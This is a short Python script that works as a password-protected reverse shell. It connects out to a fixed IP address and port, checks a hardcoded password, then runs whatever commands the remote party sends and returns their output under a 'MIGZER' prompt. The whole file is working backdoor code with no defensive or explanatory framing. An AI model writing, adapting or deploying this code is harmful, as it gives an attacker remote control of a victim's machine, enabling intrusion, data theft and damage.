#!/usr/bin/python
import subprocess
import socket

host = "192.168.0.47"
port = 12345
passwd = "H4CK"

def Login():
    global s
    s.send("Login: ")
    pwd = s.recv(1024)

    if pwd.strip() != passwd:
        Login()
    else:
        s.send("MIGZER $> ")
        Shell()

def Shell():
    while True:
        data = s.recv(1024)

        if data.strip() == "exit":
            break

        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output = proc.stdout.read() + proc.stderr.read()
        s.send(output)
        s.send("MIGZER $> ")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
Login()
